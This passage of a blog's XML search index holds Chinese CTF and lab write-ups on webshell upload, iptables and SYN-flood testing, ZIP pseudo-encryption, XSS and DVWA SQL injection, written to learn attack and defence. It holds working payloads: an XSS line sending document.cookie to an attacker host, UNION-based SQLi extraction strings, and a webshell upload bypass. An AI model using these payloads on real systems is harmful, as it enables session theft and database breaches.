    <title><![CDATA[Do you know upload？]]></title>
    <url>%2F2018%2F04%2F30%2FDo%20you%20know%20upload%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[第三届“百越杯”福建省高校网络空间安全大赛 题目内容：加油吧，少年。 过程进来一看，图片上传 顺手上传个菜刀，只要改一改content-type绕过 然后连接，发现config.php，下载。而且有ctf.sql。估计flag在数据库，下载ctf.sql打开，ERROR:// Can Not Read，只能搞数据库了 config.php打开一看 123456789101112&lt;?phperror_reporting(0);session_start();$servername = &quot;localhost&quot;;$username = &quot;ctf&quot;;$password = &quot;ctfctfctf&quot;;$database = &quot;ctf&quot;;// 创建连接$conn = mysql_connect($servername,$username,$password) or die(&quot; connect to mysql error&quot;);mysql_select_db($database);?&gt; 好了密码有了，菜刀连接 执行 1select flag from flag]]></content>
      <categories>
        <category>Web安全</category>
        <category>I春秋</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables]]></title>
    <url>%2F2018%2F04%2F29%2Fiptables%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[参考链接： iptables详解（1）：iptables概念 （必看，看到4就差不多了） iptables查看、开放、删除端口、保存设置 0xFF iptables介绍iptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫netfilter。 netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。 iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。 netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 0x00 查看规则表12345iptables -t filter -L INPUT --line-numbers //查看filter表的INPUT链中的所有规则，同时显示每天规则的顺序号iptables -t filter -Liptables -t raw -Liptables -t mangle -Liptables -t nat -L 12345678910111213141516iptables -t 表名 -L查看对应表的所有规则，-t选项指定要操作的表，省略&quot;-t 表名&quot;时，默认表示操作filter表，-L表示列出规则，即查看规则。iptables -t 表名 -L 链名查看指定表的指定链中的规则。iptables -t 表名 -v -L查看指定表的所有规则，并且显示更详细的信息（更多字段），-v表示verbose，表示详细的，冗长的，当使用-v选项时，会显示出&quot;计数器&quot;的信息，由于上例中使用的选项都是短选项，所以一般简写为iptables -t 表名 -vLiptables -t 表名 -n -L表示查看表的所有规则，并且在显示规则时，不对规则中的IP或者端口进行名称反解，-n选项表示不解析IP地址。iptables --line-numbers -t 表名 -L表示查看表的所有规则，并且显示规则的序号，--line-numbers选项表示显示规则的序号，注意，此选项为长选项，不能与其他短选项合并，不过此选项可以简写为--line，注意，简写后仍然是两条横杠，仍然是长选项。iptables -t 表名 -v -x -L表示查看表中的所有规则，并且显示更详细的信息(-v选项)，不过，计数器中的信息显示为精确的计数值，而不是显示为经过可读优化的计数值，-x选项表示显示计数器的精确值。实际使用中，为了方便，往往会将短选项进行合并，所以，如果将上述选项都糅合在一起，可以写成如下命令，此处以filter表为例。iptables --line -t filter -nvxL当然，也可以只查看某张表中的某条链，此处以filter表的INPUT链为例iptables --line -t filter -nvxL INPUT 0x02 增加规则windows10 IP地址：192.168.31.129 Kali Linux IP地址： 192.168.100.131 在没有增加规则之前，Kali Linux是可以ping到windows10的 12iptables -t filter -I INPUT -s 192.168.31.129 -j DROP //在INPUT链添加规则iptables -nvL INPUT 再ping一下，ping不通了 但是windows10可以ping 12iptables -A INPUT -s 192.168.31.129 -j ACCEPT //在INPUT链追加规则iptables -nvL INPUT 12iptables -I INPUT -s 192.168.31.129 -j ACCEPT //在INPUT链增加规则iptables -nvL INPUT 这时候ping得了window10主机了 整个ping过程如下 0x03 删除、清空规则删除规则方法一：根据规则的编号去删除规则 1iptables -t filter -D INPUT 3 上例中，使用了-t选项指定了要操作的表（没错，省略-t默认表示操作filter表），使用-D选项表示删除指定链中的某条规则，-D INPUT 3表示删除INPUT链中的第3条规则。 方法二：根据具体的匹配条件与动作删除规则 1iptables -D INPUT -s 192.168.31.129 -j ACCEPT 清空规则删除指定表中某条链中的所有规则的命令，就是”iptables -t 表名 -F 链名” -F选项为flush之意，即冲刷指定的链，即删除指定链中的所有规则，但是注意，此操作相当于删除操作，在没有保存iptables规则的情况下，请慎用。 其实，-F选项不仅仅能清空指定链上的规则，其实它还能清空整个表中所有链上的规则，不指定链名，只指定表名即可删除表中的所有规则，命令如下 1iptables -t 表名 -F 不过再次强调，在没有保存iptables规则时，请勿随便清空链或者表中的规则，除非你明白你在干什么。 1iptables -F 0x04 修改规则修改某条规则中的动作1iptables -t filter -R INPUT 1 -s 192.168.31.129 -j REJECT 注意: -s 选项以及对应的源地址不可省略 修改默认策略 1iptables -t filter -P INPUT DROP 0x05 保存规则在默认的情况下，我们对”防火墙”所做出的修改都是”临时的”，换句话说就是，当重启iptables服务或者重启服务器以后，我们平常添加的规则或者对规则所做出的修改都将消失，为了防止这种情况的发生，我们需要将规则”保存”。 可以使用下面方法手动保存/恢复配置 保存 1iptables-save &gt; /etc/sysconfig/iptables 恢复 1iptables-restore &lt; /etc/sysconfig/iptables 如果想在Kali操作系统启动时iptables设置的规则生效，则需要增加启动项：如下： 12345在/etc/init.d/文件夹下新建iptables文件，如：vim /etc/init.d/iptables，内容如下：#!/bin/bash/sbin/iptables-restore &lt; /etc/iptables/rules.v4 0x06 基本匹配条件总结-s用于匹配报文的源地址,可以同时指定多个源地址，每个IP之间用逗号隔开，也可以指定为一个网段。 1234#示例如下iptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROPiptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPTiptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT -d用于匹配报文的目标地址,可以同时指定多个目标地址，每个IP之间用逗号隔开，也可以指定为一个网段。 1234#示例如下iptables -t filter -I OUTPUT -d 192.168.1.111,192.168.1.118 -j DROPiptables -t filter -I INPUT -d 192.168.1.0/24 -j ACCEPTiptables -t filter -I INPUT ! -d 192.168.1.0/24 -j ACCEPT -p用于匹配报文的协议类型,可以匹配的协议类型tcp、udp、udplite、icmp、esp、ah、sctp等（centos7中还支持icmpv6、mh）。 123#示例如下iptables -t filter -I INPUT -p tcp -s 192.168.1.146 -j ACCEPTiptables -t filter -I INPUT ! -p udp -s 192.168.1.146 -j ACCEPT -i用于匹配报文是从哪个网卡接口流入本机的，由于匹配条件只是用于匹配报文流入的网卡，所以在OUTPUT链与POSTROUTING链中不能使用此选项。 123#示例如下iptables -t filter -I INPUT -p icmp -i eth4 -j DROPiptables -t filter -I INPUT -p icmp ! -i eth4 -j DROP -o用于匹配报文将要从哪个网卡接口流出本机，于匹配条件只是用于匹配报文流出的网卡，所以在INPUT链与PREROUTING链中不能使用此选项。 123#示例如下iptables -t filter -I OUTPUT -p icmp -o eth4 -j DROPiptables -t filter -I OUTPUT -p icmp ! -o eth4 -j DROP tcp扩展模块 常用的扩展匹配条件如下： -p tcp -m tcp --sport用于匹配tcp协议报文的源端口，可以使用冒号指定一个连续的端口范围 -p tcp -m tcp --dport 用于匹配tcp协议报文的目标端口，可以使用冒号指定一个连续的端口范围 123456#示例如下iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp --sport 22 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 22:25 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport :22 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 80: -j REJECTiptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp ! --sport 22 -j ACCEPT multiport扩展模块 常用的扩展匹配条件如下： -p tcp -m multiport --sports 用于匹配报文的源端口，可以指定离散的多个端口号,端口之间用”逗号”隔开 -p udp -m multiport --dports用于匹配报文的目标端口，可以指定离散的多个端口号，端口之间用”逗号”隔开 123456#示例如下iptables -t filter -I OUTPUT -d 192.168.1.146 -p udp -m multiport --sports 137,138 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport ! --dports 22,80 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 80:88 -j REJECTiptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80:88 -j REJECT 1iptables -A INPUT -p icmp -j REJECT // 拒绝进入防火墙的所有icmp数据包 1iptables -A FORWARD -s 192.168.1.11 -j REJECT 12iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP 0x07 防火墙规则配置和测试在Kali Linux进行配置 1234iptables -A INPUT -p icmp --icmp-type echo-request -j DROPiptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPTiptables -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPTiptables --line -vnL 思考 Linux主机防火墙处理数据包的顺序是什么？ 顺序处理，如果filter表num1没有处理这个数据包，就接着看num2等等，如果都没有，就采用默认策略 0x08 DOS防御设置syn-cookie关闭 开始攻击 1netwox 76 -i &quot;192.168.100.137&quot; -p &quot;80&quot; 靶机受到洪范攻击，靶机被卡住 配置靶机防火墙规则 12iptables -A INPUT -p tcp --dport 80 -s 192.168.100.131 -j ACCEPTiptables -A INPUT -p tcp --dport 80 -j DROP 再次攻击 可以对防火墙进行如下配置 1234567891011121314151617181920212223242526272829303132333435363738394041iptables –F iptables –X iptables -P INPUT DROP iptables -P OUTPUT ACCEPT iptables -P FORWARD DROP iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT iptables -A OUTPUT -p icmp -j ACCEPT (OUTPUT设置成DROP的话) iptables -A INPUT -p icmp -j ACCEPT (INPUT设置成DROP的话) iptables -A INPUT -i lo -p all -j ACCEPT (如果是INPUT DROP) iptables -A OUTPUT -o lo -p all -j ACCEPT(如果是OUTPUT DROP) iptables -N syn-flood iptables -A INPUT -p tcp --syn -j syn-flood iptables -I syn-flood -p tcp -m limit --limit 3/s --limit-burst 6 -j RETURN iptables -A syn-flood -j REJECT iptables -A INPUT -i eth0 -p tcp --syn -m connlimit --connlimit-above 15 -j DROP iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -p tcp --syn -m limit --limit 12/s --limit-burst 24 -j ACCEPT iptables -A FORWARD -p tcp --syn -m limit --limit 1/s -j ACCEPT /etc/rc.d/init.d/iptables save service iptables restart]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客提交百度谷歌收录]]></title>
    <url>%2F2018%2F04%2F28%2F%E5%8D%9A%E5%AE%A2%E6%8F%90%E4%BA%A4%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E6%94%B6%E5%BD%95%2F</url>
    <content type="text"><![CDATA[留个坑，以后再慢慢写 Hexo+Next主题博客提交百度谷歌收录hexo高阶教程：想让你的博客被更多的人在搜索引擎中搜到吗？ https://hexo.io/docs/deployment.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[啦啦啦WriteUp]]></title>
    <url>%2F2018%2F04%2F28%2F%E5%95%A6%E5%95%A6%E5%95%A6WriteUp%2F</url>
    <content type="text"><![CDATA[解题链接：http://ctf5.shiyanbar.com/misc/LOL/LOL.pcapng hint隐藏在数据包中的秘密 分析用wireshark打开，过滤http，有两个post请求，发现有lol.zip,lol.docs 右键-&gt;追踪流-&gt;TCP 把PK开始的数据复制粘贴到010 Editor，先转为原始数据再复制粘贴，去掉无关的数据 保存为ok.zip 解压需要密码 zip文件用winhex看一下，会发现头上的加密位是未加密的状态，那么肯定就是在文件目录区所修改的伪加密了。 果不其然，在文件目录区修改伪加密位即可解压文件。 参考下面图片 这个题目具体位置如下，四个都要改，就可以解压成功，有四个txt文件 txt文件打开，前面都是89504E47 PNG (png)文件头：89504E47 直接改后缀发现打不开，复制文本的数据，粘贴至Winhex，存储为.png文件 打开发现得到了四个二维码，将其拼接起来 最后一步，扫码得到flag 参考资料：常见文件类型识别 zip伪加密破解方法 zip伪加密 伪加密知识点：一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度00 00：扩展记录长度 压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50)3F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量 压缩源文件目录结束标志：50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数59 00 00 00：目录区尺寸大小3E 00 00 00：目录区对第一张磁盘的偏移量00 00：ZIP 文件注释长度]]></content>
      <categories>
        <category>Misc</category>
        <category>实验吧</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5之守株待兔，你需要找到和系统锁匹配的钥匙]]></title>
    <url>%2F2018%2F04%2F28%2FMD5%E4%B9%8B%E5%AE%88%E6%A0%AA%E5%BE%85%E5%85%94%EF%BC%8C%E4%BD%A0%E9%9C%80%E8%A6%81%E6%89%BE%E5%88%B0%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%94%81%E5%8C%B9%E9%85%8D%E7%9A%84%E9%92%A5%E5%8C%99%2F</url>
    <content type="text"><![CDATA[题目链接:http://ctf5.shiyanbar.com/misc/keys/keys.php?key=d41d8cd98f00b204e9800998ecf8427e hint：12从系统锁下手，通过get方式key字段提交答案，直到您的钥匙与系统锁相等则成功。格式：CTF&#123;&#125; 分析：时间戳md5后生成的密钥 直接上代码 1234567891011121314151617181920import timeimport hashlibimport requestsdef md5(src): md5 = hashlib.md5() md5.update(src) return md5.hexdigest()def getTime(): return str(int(time.time())-2)def getFlag(Unixtime): url='http://ctf5.shiyanbar.com/misc/keys/keys.php?key='+Unixtime r=requests.get(url) print(r.content)for i in range(10): getFlag(getTime()) time.sleep(1) 刚开始都是false 1b&apos;\r\n\r\nfalse&lt;br&gt;\xcf\xb5\xcd\xb3\xb5\xc4\xc3\xdc\xd4\xbf=b5acfe0daa101b0b4c5f2f8bdf834038&lt;br&gt;\xc4\xfa\xb5\xc4\xc3\xdc\xd4\xbf=57ec220296a9d7e1316c086a90185a0b&apos; 这是因为time.time()拿到的时间戳跟实验吧的时间戳有点延迟 拿出来的b5acfe0daa101b0b4c5f2f8bdf834038和57ec220296a9d7e1316c086a90185a0b 到https://www.md5online.org/去解密一下 12Found : 1524904334(hash = b5acfe0daa101b0b4c5f2f8bdf834038) 12Found : 1524904333(hash = 57ec220296a9d7e1316c086a90185a0b) 发现本地的时间慢了一秒，就在time.time()后+1 根据自己的时间调整一下 flag假的flag，自己跑跑代码吧 1b&quot;\r\n\r\n&lt;script&gt;alert(&apos;flagxxxxxxxx&apos;)&lt;/script&gt;&quot; 参考链接： https://www.jianshu.com/p/e4b8fd7dda08]]></content>
      <categories>
        <category>Misc</category>
        <category>实验吧</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全实验链接]]></title>
    <url>%2F2018%2F04%2F27%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[实验一 流量捕获实验 实验二 TCP/IP协议攻击 实验三 CA证书与SSL连接(DJ的资料已经很详细了，我就不放出了) 实验四 配置主机防火墙防止Dos攻击 ​ 后面Dos攻击还需要实验一下 实验六 综合扫描 实验五 WiFi钓鱼 实验七 XSS跨站脚本攻击 实验八 SQL注入攻击]]></content>
  </entry>
  <entry>
    <title><![CDATA[Wireshark捕获手机流量]]></title>
    <url>%2F2018%2F04%2F27%2F%E6%8D%95%E8%8E%B7%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[环境windows10 实验过程设置——&gt;网络和Internet——&gt;移动热点——&gt;开启 手机连上移动热点，被分配到的IP地址是192.168.137.248 手机在一个网址登陆 然后在站长之家查询一下域名的ip地址 得到 1IP:121.42.137.89 Wireshark过滤一下 1ip.src == 192.168.137.248 and ip.addr == 121.42.137.89 and http 过滤得到 查看Post请求，在HTML表单可以查看到提交的用户名和密码]]></content>
  </entry>
  <entry>
    <title><![CDATA[Nessus初步使用]]></title>
    <url>%2F2018%2F04%2F27%2FNessus%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[如何安装可以参考最后的参考链接 安装之后浏览器会自动跳出页面 输入用户名和密码后 继续输入激活码 更新插件出错 123PS C:\Program Files\Tenable\Nessus&gt; .\nessuscli update[Thu Apr 26 23:50:26 2018][12888.1] Could not open C:\ProgramData\Tenable\Nessus\nessus\master.key - 拒绝访问。Error: Only root can use update 使用管理员权限打开DOS 1.\nessuscli update 更新好之后进入 1https://localhost:8834/#/ 输入之前设置好了账号密码，进入 选择Advanced Scan 简单配置下，扫描本地，save 在My Scans就会出现刚刚创建的Scan，点击lauch 然后耐心等待一下 点一个进去有描述和解决方案 参考链接官方7.0文档：https://docs.tenable.com/nessus/7_0/Content/Resources/PDF/Nessus_7_0.pdf 官方6.11文档：https://docs.tenable.com/nessus/6_11/Content/Resources/PDF/Nessus_6_11.pdf Nessus离线安装及升级插件 Nessus的安装/激活/更新]]></content>
      <categories>
        <category>CTF工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[合天的跨站脚本攻击基础实验]]></title>
    <url>%2F2018%2F04%2F27%2F%E5%90%88%E5%A4%A9%E7%9A%84%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[实验环境两台互相连网Windows主机。拓扑图如下： 说明： 网络环境中有两台主机，有一台主机在实验环境可见并可登录，我们称为实验机（客户机）；另一台主机不可见，但从实验机可以访问，这台主机即为本次实验任务的攻击目标，我们称为目标机。 实验机IP为：10.1.1.78；目标机IP为：10.1.1.2。 在目标主机上安装了跨站脚本攻击的演练平台（留言系统），供本次实验使用。 实验步骤一预备任务：启动并访问留言系统​ 在预备任务中，我们将安装在目标主机上的跨站脚本攻击演练平台（留言系统）。 ​ 1、使用远程桌面登录至练习主机。 ​ 2、使用浏览器打开http://10.1.1.2页面，进入跨站脚本攻击演练平台，如下图所示： ​ 3、给留言系统添加留言，熟悉本系统环境。 ​ 4、管理留言。 ​ 点击“管理留言”，用户名：admin，密码：admin123，可以对刚留言进行管理。 存储式跨站脚本漏洞检测​ 1、登录到实验机上，用IE浏览器中打开留言系统（10.1.1.2）。 ​ 2、在留言内容中填写包含有跨站测试的脚本，提交后观察返回效果。 1&lt;script&gt;alert(&quot;XSS TEST&quot;)&lt;/script&gt; ​ 如下图所示： ​ 3、刷新留言系统，如果新加留言显示如下，则说明系统有存储式跨站漏洞。 ​ 4、思考： ​ 测试当其他用户打开这个页面时，嵌入的代码是否会执行？分析留言系统代码，为什么填写的留言脚本会被执行？ 跨站脚本攻击的危害不包括下列哪项： 【A】盗取其它用户的cookie; 【B】盗取web系统的登录帐号； 【C】即使不访问危害页面也能读取用户的cookie; 【D】获取访问用户的帐户信息； 答案选C，因为XSS攻击需要用户访问危害页面才起作用 实验步骤二利用存储式跨站漏洞窃取用户cookie 使用跨站漏洞加载恶意网页 ​ 清空实验一任务，将恶意网页（假设http://www.heetian.com）放入留言系统数据库，并在用户端执行； ​ 1、增加一留言，并在留言内容中改为 &lt;iframe src=&quot;http://www.hetianlab.com&quot;&gt;&lt;/iframe&gt;，测试返回效果。 2、隐藏恶意网页。增加留言，内容包含以下语句：&lt;iframe src=https://www.baidu.com width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;，观察返回状态，网页被执行，但未在留言系统界面中显示。这样如果是攻击脚本就可以用此方法隐藏自己。 在本实验中，在提交内容中增加：&lt;iframe src=http://www.baidu.com width=&quot;0&quot; height=&quot;0&quot;&gt;&lt;/iframe&gt;，其目的是：【单选题】 【A】在访问实验的显示时，自动会访问www.baidu.com页面，而且用户在页面上查觉不到； 【B】读取访问www.baidu.com页面的cookie； 【C】在实验的显示内容页面中加入www.baidu.com页面，而且访问用户能够看到； 【D】盗取访问www.baidu.com的cookie 选A 实验步骤三利用存储式跨站漏洞窃取用户cookie ​ 1、继续添加留言，包含以下内容：&lt;script&gt;document.write(document.cookie)&lt;/script&gt; ​ 结果如图所示： 2、继续添加留言，包含以下内容： ​ &lt;script&gt;alert(document.cookie)&lt;/script&gt; 3、使用管理员登录，观察显示的cookie有什么不同？ 发现显示的多了管理员的账号和密码 4、思考：这种窃取cookie的方式有什么缺点？有什么方法可以将用户的cookie窃取出并保存下来，而且用户看不到？ ​ 5、在攻击机上使用提供的页面搭建WEB服务器，以便进一步保存浏览用户的cookie。 打开IIS 更换主目录 搭建IIS服务器过程中应注意如下几点： 1）在Web服务扩展中允许Active Server Pages服务 2）默认网站-属性-文档中添加index.asp内容页。 3）在：C:\tools\跨站脚本攻击\中的cookies文件夹属性-安全-组或用户名称（G）-添加-高级-立即查找中找到IUSR_BJHIT-YXI7NEFU8用户，选择并确定 4)给IUSR_BJHIT-YXI7NEFU8用户写入权限 搭建好服务器后，在浏览器中输入本机IP地址进行测试，如下图所示，表示web服务正常进行。 返回http://10.1.1.2页面，继续添加留言，包含以下内容： 1&lt;script&gt;document.write(&quot;&lt;iframe width=0 height=0 src=&apos;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&apos;&gt;&lt;/iframe&gt;&quot;);&lt;/script&gt; 提交留言后观察目标服务器页面，没有看到异常现象，如下图所示： 再打开本地页面，查看接收浏览用户的cookie接收情况： 可以看到，已经接收到用户的cookie了，这些cookie包含了所有浏览该页面的信息，如果是登录用户的话，cookie包含了用户的用户名与密码信息。 从本实验来看，下列哪种说法是错误的：【单选题】 【A】10.1.1.2服务器提供web服务，同时具有XSS缺陷； 【B】攻击者通过攻击10.1.1.2服务器，获取该服务器相关敏感信息或数据； 【C】document.write(&quot;&lt;iframe width=0 height=0 src=&#39;http://10.1.1.78/cookie.asp?cookie=&quot;+document.cookie+&quot;&#39;&gt;&lt;/iframe&gt;&quot;);主要作用是获取用户cookie后并传递给用户操作机； 【D】一般情况下，XSS攻击对服务器安全性并没有影响； 选B，因为并没有攻击10.1.1.2服务器 参考网址：实验网址：http://www.hetianlab.com/expc.do?ce=7eb961c2-56d2-49c1-856a-c65edd1c332c 实验指导视频：http://v.youku.com/v_show/id_XODQyMzMzODE2.html?spm=a2h0k.8191407.0.0&amp;from=s1.8-1-1.2]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记（4）：DVWA的SQL注入实验]]></title>
    <url>%2F2018%2F04%2F27%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%EF%BC%9ADVWA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[SQL InjectionSQL Injection，即SQL注入，SQLi，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害巨大，常常会导致整个数据库被“脱裤”，如今SQL注入仍是现在最常见的Web漏洞之一。 SQL注入分类按SQLMap中的分类来看，SQL注入类型有以下5种： 12345UNION query SQL injection（可联合查询注入）Stacked queries SQL injection（可多语句查询注入） Boolean-based blind SQL injection（布尔型注入） Error-based SQL injection（报错型注入） Time-based blind SQL injection（基于时间延迟注入） SQL注入常规利用思路：123451、寻找注入点，可以通过web扫描工具实现2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息） 4、可以通过获得的用户信息，寻找后台登录。5、利用后台或了解的进一步信息，上传webshell或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。 手工注入常规思路：12345671.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.查询到账户的数据 下面对四种级别的代码进行分析。 LOW等级123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; mysqli_close($GLOBALS["___mysqli_ston"]);&#125;?&gt; 分析：由代码可知，通过REQUEST方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。 利用常用注入测试的POC 判断注入输入1 输入&#39;，单引号 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1 注入id=1’ and ‘1’=’2` 返回为空 注入id=1&#39; or &#39;1&#39;=&#39;1，返回全部用户 查询表的列数id=1&#39; order by 1 # 页面正常 id=1&#39; order by 2 # 页面正常 id=1&#39; order by 3 # 页面还是正常，MySQL的注释也有#，但为啥不起作用 id=1&#39; order by 3 --，报错，说明表的有两列 确立回显名11&apos; union select 1,2# 猜数据库：11&apos; union select 1,database()-- 用户和数据库版本11&apos; union select user(),version()-- 注意：union查询结合了两个select查询结果，根据上面的order by语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用union查询结合我们构造的另外一个select.注意在使用union查询的时候需要和主查询的列数相同。 猜表名11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()-- 得到表名：guestbook,users 猜列名1231&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273-- 1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name =&apos;users&apos;-- (用编码就不用单引号，用单引号就不用编码，0x7573657273是users的十六进制) 得到列： 1id,name,password,email,birthday,user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,pid 猜用户数据列举几种payload: 1231&apos; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users -- 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- 1&apos; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users -- 得到用户数据 1234567891011121314151617181920212223ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: adminSurname: adminID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: admin : 5f4dcc3b5aa765d61d8327deb882cf99ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: gordonb : e99a18c428cb38d5f260853678922e03ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: 1337 : 8d3533d75ae2c3966d7e0d4fcc69216bID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: pablo : 0d107d09f5bbe40cade3de5c71e9e9b7ID: 1&apos; union select null,concat_ws(char(32,58,32),user,password) from users -- First name: Surname: smithy : 5f4dcc3b5aa765d61d8327deb882cf99 猜root用户11&apos; union select 1,group_concat(user,password_expired) from mysql.user-- 拿到root用户密码为空：rootN,mysql.sysN,PC-201702142156N 自个去数据库查询一下，结果一样 123456789mysql&gt; select Host,User,password_expired from mysql.user;+-----------+-----------------+------------------+| Host | User | password_expired |+-----------+-----------------+------------------+| localhost | root | N || localhost | mysql.sys | N || % | PC-201702142156 | N |+-----------+-----------------+------------------+3 rows in set (0.00 sec) Medium等级12345678910111213141516171819202122232425262728293031 &lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id); $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( 